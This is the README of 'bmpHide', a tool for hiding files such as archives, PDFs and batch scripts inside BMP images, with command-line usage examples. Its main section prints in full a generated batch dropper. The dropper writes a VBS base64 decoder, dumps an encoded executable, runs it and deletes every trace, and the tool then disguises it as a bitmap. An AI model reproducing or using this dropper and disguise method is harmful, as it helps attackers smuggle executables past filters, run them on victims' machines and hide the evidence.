bmpHide
==========

  *This tool is inspired by the [Break into shell from MsPaint](http://hak5.org/episodes/hak5-925) trick.*

All bitmap images have a pixel array, which defines colour values for all the image pixels. This application takes advantage of this and embeds files within this pixel array of 24-bit BMP images. Although multiple versions of the BMP file format exist, they are well documented. 

Very useful facts about the way BMP bitmap files store the colours of the pixels:

 - The pixel array must begin at a memory address that is a multiple of 4 bytes.
 - The pixel array is padded to a multiple of 4 bytes in size.
 - Pixels are stored “upside-down” with respect to normal image raster scan order, starting in the lower left corner, going from left to right, and then row by row from the bottom to the top of the image.

**bmpHide** will convert the input file into an array of pixel RGB colours. The minimum necessary size of the output BMP file is determined automatically.

 

Usage Scenarios
---------------

Because a lot of applications are somewhat tolerant of any garbage data present at the beginning of their supported files, we can actually *paint* different other file types: archives, PDF documents, Office documents and fully functional batch scripts.

**Hide regular text files**

    $ python convert.py samples/test1.txt out.bmp
    [*] Reading text from samples/test1.txt
    [*] Need a 8x8 BMP
    [+] Writting BMP to out.bmp
    $ file out.bmp 
    out.bmp: PC bitmap, Windows 3.x format, 8 x 8 x 24
    $ cat out.bmp 
    BM
    
    The quick brown fox jumps over the lazy dog.
    Fox dwarves chop my talking quiz job

**Embed a simple batch file**

    $ python convert.py samples/test2.bat out.bmp
    [*] Reading text from samples/test2.bat
    [*] Need a 4x4 BMP
    [+] Writting BMP to out.bmp
    $ cat out.bmp 
    BMf6(0
    
    cmd.exe

**Embed archives**

    $ python convert.py samples/test3.zip out.bmp
    [*] Reading text from samples/test3.zip
    [*] Need a 12x12 BMP
    [+] Writting BMP to out.bmp
    $ file out.bmp 
    out.bmp: PC bitmap, Windows 3.x format, 12 x 12 x 24
    $ unzip -l out.bmp
    Archive:  out.bmp
    warning [out.bmp]:  58 extra bytes at beginning or within zipfile
      (attempting to process anyway)
      Length      Date    Time    Name
    ---------  ---------- -----   ----
            8  2014-09-20 20:17   test2.txt
    ---------                     -------
            8                     1 file

**PDF documents**

    $ python convert.py samples/test4.pdf out.bmp 
    [*] Reading text from samples/test4.pdf
    [*] Need a 20x20 BMP
    [+] Writting BMP to out.bmp
    $ file out.bmp 
    out.bmp: PC bitmap, Windows 3.x format, 20 x 20 x 24
    $ xpdf out.bmp

**Hide Office XML-based documents**

    $ python convert.py samples/test5.docx out.bmp 
    [*] Reading text from samples/test5.docx
    [*] Need a 44x44 BMP
    [+] Writting BMP to out.bmp

**Complex batch scripts**

We can embed inside a BMP a complex batch script which *dumps a base64 encoded binary, decodes it, launches the executable and deletes all the traces* when the process terminates:

    $ python createBat.py 
    Create a batch file (.BAT) that dumps and runs an exe.
    Usage: createBat.py <exe>
    $ python createBat.py samples/calc.exe 
    $ ls -al wrapper.bat 
    -rw-rw-r-- 1 ci ci 192829 Sep 22 21:21 wrapper.bat
    $ python convert.py wrapper.bat out.bmp 
    [*] Reading text from wrapper.bat
    [*] Need a 256x256 BMP
    [+] Writting BMP to out.bmp
    $ cat out.bmp 
    BM66(
    
    @echo off
    echo ' Decode and dump a base64 encoded file >> run.vbs
    echo ' Usage: cscript decode.vbs [inFile] [outFile] >> run.vbs
    echo ' E.g.: cscript decode.vbs binary.txt binary.out >> run.vbs
    echo Dim inFile, outFile >> run.vbs
    echo inFile = WScript.Arguments(0) >> run.vbs
    echo outFile = WScript.Arguments(1) >> run.vbs
    echo Dim objFS, objTS >> run.vbs
    echo Set objFS = CreateObject("Scripting.FileSystemObject") >> run.vbs
    echo Set objTS = objFS.OpenTextFile(inFile, 1) >> run.vbs
    echo Dim base64Encoded, base64Decoded >> run.vbs
    echo base64Encoded = objTS.ReadAll >> run.vbs
    echo base64Decoded = decodeBase64(base64Encoded) >> run.vbs
    echo writeBytes outFile, base64Decoded >> run.vbs
    echo Private Function decodeBase64(base64) >> run.vbs
    echo Dim DM, EL >> run.vbs
    echo Set DM = CreateObject("Microsoft.XMLDOM") >> run.vbs
    echo ' Create temporary node with Base64 data type >> run.vbs
    echo Set EL = DM.createElement("tmp") >> run.vbs
    echo EL.DataType = "bin.base64" >> run.vbs
    echo ' Set encoded String, get bytes >> run.vbs
    echo EL.Text = base64 >> run.vbs
    echo decodeBase64 = EL.NodeTypedValue >> run.vbs
    echo End Function >> run.vbs
    echo Private Sub writeBytes(file, bytes) >> run.vbs
    echo Dim binaryStream >> run.vbs
    echo Set binaryStream = CreateObject("ADODB.Stream") >> run.vbs
    echo binaryStream.Type = 1	' adTypeBinary >> run.vbs
    echo 'Open the stream and write binary data >> run.vbs
    echo binaryStream.Open >> run.vbs
    echo binaryStream.Write bytes >> run.vbs
    echo binaryStream.SaveToFile file, 2  ' adSaveCreateOverWrite >> run.vbs
    echo End Sub >> run.vbs
    echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> binary.txt
    echo 8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0K >> binary.txt
    
    ........
    echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA== >> binary.txt
    run.vbs binary.txt binary.exe
    binary.exe
    del run.vbs
    del binary.exe
    del binary.txt
    del wrapper.bat

In this last case, the generated image looks like this:

![Not a stereogram!](http://cyberinc.co.uk/wp-content/uploads/2014/09/out.bmp)
Project content
---------------

**convert.py** - Store any file inside the pixel array of a 24-bit bitmap image (BMP).

    $ python convert.py [in-file] [out-file]

**decode.vbs** - VB helper script to decode and dump a base64 encoded file. Called from a BAT file, as there is no native base64 decoding functionality in .bat files without VBS.

    Base64 encode a binary:
    $ cat binary | base64 -w 0 > binary.txt
    Decode:
    > cscript decode.vbs binary.txt binary.out

**createBat.py** - Create a batch file (.BAT) that dumps and runs an exe. Cleans any trace afterwards.

    $ python createBat.py [exe]

References
----------

 - [Embedding files within bitmap images](http://cyberinc.co.uk/embedding-files-within-bitmap-images/)
 - [BMP File Format](http://en.wikipedia.org/wiki/BMP_file_format)
 - [Break into shell with MsPaint](http://hak5.org/episodes/hak5-925)

